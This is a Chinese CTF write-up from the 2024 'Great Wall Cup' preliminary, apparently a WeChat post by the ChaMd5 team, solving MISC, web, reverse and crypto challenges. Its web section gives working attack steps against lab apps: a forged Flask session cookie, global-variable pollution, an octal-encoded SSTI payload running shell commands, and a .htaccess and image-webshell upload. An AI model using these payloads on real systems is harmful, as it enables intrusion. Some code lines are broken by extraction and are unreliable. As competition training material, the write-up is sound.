---
title: 第四届“长城杯”网络安全大赛暨京津冀网络安全技能竞赛（初赛）by Mini-Venom
url: https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247510978&idx=1&sn=4c84dd35d4871488274dc9e73150a12c&chksm=e89d831adfea0a0cd22b293f411a7b2a4f508d193a9ffb29c51b05372d1fb476df0b4e8dc6e4&scene=58&subscene=0#rd
source: ChaMd5安全团队
date: 2024-09-11
fetch_date: 2025-10-06T18:29:07.689286
---

# 第四届“长城杯”网络安全大赛暨京津冀网络安全技能竞赛（初赛）by Mini-Venom

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/PUubqXlrzBTxZFxrl1hoEANo53tsbD8umQ7s8cohEO0M3BWZ6oh58AIWCF07KGVE2P3owBXCZ1DeUcayKyHg4w/0?wx_fmt=jpeg)

# 第四届“长城杯”网络安全大赛暨京津冀网络安全技能竞赛（初赛）by Mini-Venom

Mini-Venom

ChaMd5安全团队

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTxZFxrl1hoEANo53tsbD8ucxI17PSsstzGaeSicBAIEZyKjdYEYsxtO30mK7SHvmw6JR2KzBsHTnw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTxZFxrl1hoEANo53tsbD8uGDGfRxKB0e9sPJkN5fGg2oUlBicAGO4kviasHico0VwGnaLSkxuoMzyTw/640?wx_fmt=png&from=appmsg)

## MISC

### Brick Game ·

签到题目

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTxZFxrl1hoEANo53tsbD8usSvKhmrBJq8AwNgaIPTyQNBkdjJN8LWlJhszAD4Xn4ejpafPNQdE1w/640?wx_fmt=png&from=appmsg)

### 漏洞探踪, 流量解密 ·· ·

提取IP

```
cat oa.access.log|awk '{print $1}'|uniq -c|sort -nr
```

IP：192 .168 .30 .234 是阶段2密码
然后看POST请求，是通达OA的洞， 后面有一个 /raw ，还有一个 /key ，有提示

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTxZFxrl1hoEANo53tsbD8uMZ5cPqLnfiafIz2Z3GATgJV3BhlqqfV5NqoXejZkBWDPH5OhQkorxLQ/640?wx_fmt=png&from=appmsg)

是RC4加密，直接解密就好了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTxZFxrl1hoEANo53tsbD8uxib7u728icwibeBzhW8e1sdYYY5kN30icWsiaQkEK8H6jdXzVuQibpzM6bzA/640?wx_fmt=png&from=appmsg)

### 最安全的加密方式

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTxZFxrl1hoEANo53tsbD8uTiccLODyqTRKrM5ujtdM6WtIULzJS9kOjkbd3iaACicNTuqibIV7qLaLWw/640?wx_fmt=png&from=appmsg)

有 $pass= '25ming@ ' ，后面有压缩包，压缩了 flag .txt

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTxZFxrl1hoEANo53tsbD8u4TgicH2yBhT6DDj7yrx3WHeVlFBX3Bpp2Qw9x9psuHCF2icgYiaEW4Eeg/640?wx_fmt=png&from=appmsg)

提取出来用上面的pass解密，然后拿到一个md5的表，爆破字符即可：

```
from hashlib import md5

c = '''8fa14cdd754f91cc6554c9e71929cce7
2db95e8e1a9267b7a1188556b2013b33
0cc175b9c0f1b6a831c399e269772661
b2f5ff47436671b6e533d8dc3614845d
f95b70fdc3088560732a5ac135644506
b9ece18c950afbfa6b0fdbfa4ff731d3
2510c39011c5be704182423e3a695e91
e1671797c52e15f763380b45e841ec32
b14a7b8059d9c055954c92674ce60032
6f8f57715090da2632453988d9a1501b
cfcd208495d565ef66e7dff9f98764da
03c7c0ace395d80182db07ae2c30f034
e358efa489f58062f10dd7316b65649e
b14a7b8059d9c055954c92674ce60032
c81e728d9d4c2f636f067f89cc14862c
e1671797c52e15f763380b45e841ec32
4a8a08f09d37b73795649038408b5f33
4c614360da93c0a041b22e537de151eb
4b43b0aee35624cd95b910189b3dc231
e1671797c52e15f763380b45e841ec32
b14a7b8059d9c055954c92674ce60032
e1671797c52e15f763380b45e841ec32
8d9c307cb7f3c4a32822a51922d1ceaa
4a8a08f09d37b73795649038408b5f33
4b43b0aee35624cd95b910189b3dc231
57cec4137b614c87cb4e24a3d003a3e0
83878c91171338902e0fe0fb97a8c47a
e358efa489f58062f10dd7316b65649e
865c0c0b4ab0e063e5caa3387c1a8741
d95679752134a2d9eb61dbd7b91c4bcc
7b8b965ad4bca0e41ab51de7b31363a1
9033e0e305f247c0c3c80d0c7848c8b3
cbb184dd8e05c9709e5dcaedaa0495cf ' ' ' .split('\n ')
s = list(range(32,127))
t = {}

for k in s :
    t[md5(chr(k) .encode()) .hexdigest()] = chr(k)
flag= ' '
for k in c :
    flag += t[k] 48
print(flag)
```

## WEB

### SQL UP ···

有hint：

```
Hint:<!-- The developer likes to use fuzzy matching in the login module. -->
```

username: admin password: 1
登录，头像处上传 .htaccess 和图片马，在/uploads/路径下，执行tac /flag即可

## candy shop

1.进去到环境后，爆破得出key是a123456
2.利用此key伪造admin身份访问admin 目录

```
python .\flask_session_cookie_manager3.py decode -s "a123456" -c ".eJwNy8EKgCAMANB_2blDNE3tZ2JtMyQySD1E9O95ffBe4HLHtV6HZliAMUQevbcyErlp04h21iBCQSbrLKJBMuxggCSaa6pPX3vTUju1onemUzuRnCnD9wOMFB3q.Zt1QjQ.OTtQdF_Cpv1tSr2nRVze_HVtck8"

{'csrf_token': 'c39fc0885d0aa72bef356e9dda9d25753343a4c7', 'identity':'guest', 'username': 'admin'}
```

3.利用链污染将全局变量sold污染为600

```
python .\flask_session_cookie_manager3.py encode -s "a123456" -t " {'csrf_token': '94c60c3656b0b0e1f9875b5007a36bdb8c99a4c2', 'identity':'admin', 'username': 'admin','__init__':{'__globals__':{'sold':600}}}"

.eJxNi0EKwyAQAP-y5x42TTTRz8iumiA1K0R7KMG_Vilt5mBucHXa3etvKKABbN4jX7WSjMyxmk326pYIa40aw68eWNo8U94QApRWmqfcVE4k4z0rvESOuNfci5Jas6BvQcfuTDl-tNacgCrEXvvXwr9KtA.Zt1Rqw.ccWGXf3_b2qaTKmJKf1O7VZKJdg
```

4.然后得出flag路径

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTxZFxrl1hoEANo53tsbD8u2THokKc1uBWtC9u6S2lvMqbP0HM4ZGLnL6YoCYAv0M43z4XcTa8SbA/640?wx_fmt=png&from=appmsg)

5.由于/admin/view\_inventory目录是由render\_template\_string渲染有ssti漏洞
payload：

```
python .\flask_session_cookie_manager3.py encode -s "a123456" -t "{'csrf_token': '94c60c3656b0b0e1f9875b5007a36bdb8c99a4c2', 'identity':'admin', 'username': 'admin','__init__':{'__globals__':{'inventory':'{{7*7}}'}}}"

.eJxNjEEKwyAQRe8yy9KFbaLGXEYcNWVoMoKaQhHvXks33f3_4L0GvuTN1vSMDCuY2SvhJyUVCh
TxtplFS5RCaDcpDLh4Y9zs73AFCpEr1fewXDiIBzpLzOyOIesJaZqLaxt7Mee0O3ld4lfo5Dyt9CavujeoffAQLkL0I.Zt1SVw.Y8voG3JvYxRwEznVxh_B1j2Pj4M
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTxZFxrl1hoEANo53tsbD8uXMDN4SnYbgMjucNPtqTjibXQQsucgmicloD7Lw9zbCfBBBNz9J6yQ4jQ/640?wx_fmt=png&from=appmsg)

由于以上sanitize\_inventory\_sold函数对污染参数做了过滤，只能进行无参rce，转换为8进制进行命令执行

```
{{''.__class__().__bases__[0]['__subclasses__'][133]['__init__']
['__globals__']['__builtins__']['eval']
('__import__("os").popen("env").read()')}}

这是以上命令转换的8进制形式
{{\'\'[\'\\137\\137\\143\\154\\141\\163\\163\\137\\137\']
[\'\\137\\137\\142\\141\\163\\145\\163\\137\\137\'][0]
[\'\\137\\137\\163\\165\\142\\143\\154\\141\\163\\163\\145\\163\\137\\137\'
]()[133][\'\\137\\137\\151\\156\\151\\164\\137\\137\']
[\'\\137\\137\\147\\154\\157\\142\\141\\154\\163\\137\\137\']
[\'\\137\\137\\142\\165\\151\\154\\164\\151\\156\\163\\137\\137\']
[\'\\145\\166\\141\\154\']
(\'137\\137\\151\\155\\160\\157\\162\\164\\137\\137\\050\\042\\157\\163\\04
2\\051\\056\\160\\157\\160\\145\\156\\050\\042\\042\\051\\056\\162\\145\\14
1\\144\\050\\051')}}
```

利用 find /tmp | grep flag 命令 找到flag所在目录
tac读取flag

## REVERSE

### easyre

64bit，没壳，直接ida打开分析，然后F5查看伪代码，找到 main 函数，

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
const __m128i *v3; // rcx
unsigned __int64 v4; // r8
__int64 i; // r10
__int64 v6; // rax
if ( argc <= 1 )
  exit(0);
v3 = (const __m128i *)argv[1];
v4 = 1LL;
for ( i = 0LL; i != 43; ++i )
{
  v3->m128i_i8[i] ^= v3->m128i_u8[i + 1 + -42 * (v4 / 0x2A)];
  ++v4;
  }
  if ( _mm_movemask_epi8(
    _mm_and_si128(
    _mm_cmpeq_epi8(_mm_loadu_si128(v3), (__m128i)xmmword_140021410),
    _mm_cmpeq_epi8(_mm_loadu_si128(v3 + 1),
    (__m128i)xmmword_140021400))) == 0xFFFF )
    {
      v6 = sub_1400011A0(&qword_1400312E0, "flag is your input", v4,
      0xC30C30C30C30C30DuLL);
      sub_1400015A0(v6);
  }
  return 0;
}
```

逻辑很清晰，就是一个异或，然后比对，去内存找到加密后的数据，

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTxZFxrl1hoEANo53tsbD8uIXQMCudYr7YEuXVonoWe63c29xsluHUjaGuibcnEZoYyAIHfeRfANibQ/640?wx_fmt=png&from=appmsg)

然后写脚本解密

```
#include <iostream>
#include <vector>
int main() {
  std::vector<unsigned char> encoded = { 0x0A, 0x0D, 0x06, 0x1C, 0x1D,
  0x05, 0x05, 0x5F, 0x0D, 0x03,
  0x04, 0x0A, 0x14, 0x49, 0x05,
  0x57, 0x00, 0x1B, 0x19, 0x02,
  0x01, 0x54, 0x4E, 0x4C, 0x56,
  0x00, 0x51, 0x4B, 0x4F, 0x57,
  0x05, 0x54, 0x55, 0x03, 0x53,
  0x57, 0x01, 0x03, 0x07, 0x04,
  0x4A, 0x77, 0x0D };
  std::vector<int> xorIndices;
  int stepCounter = 1;
  for (int i = 0; i < encoded.size(); i++) {
    int index = i + 1 - 42 * (stepCounter / 42);
    xorIndices.push_back(index);
    stepCounter++;
  }
  int currentIndex = encoded.size() - 1;
  for (int i = encoded.size() - 1; i >= 0; i--) {
    encoded[i] ^= encoded[xorIndices[currentIndex]];
    currentIndex--;
  }
  for (auto byte : encoded) {
    std::cout << byte;
  }
  std::cout << std::endl;
  return 0;
}
```

## CRYPTO

### Random RSA ·

普遍意义上来说，nextprime不会超出枚举范围，两层组合，复杂度上来看也依然可以尝试,n的结构很简单的二元式子，flag也证明了只需爆破， 一些格的做法这里似乎找不到合适的放缩， 维度也较低，故而放弃

```
from Crypto .Util.number import *
from sympy.ntheory.residue_ntheory import nthroot_mod 3
p =170302223332374952785269454020752010235000449292324018706323228421794605831609342383813680059406887437726391567716617403068082252456126724116360291722050578106527815908837796377811535800753042840119867579793401648981916062128752925574017615120362457848369672169913701701169754804744410516724429370808...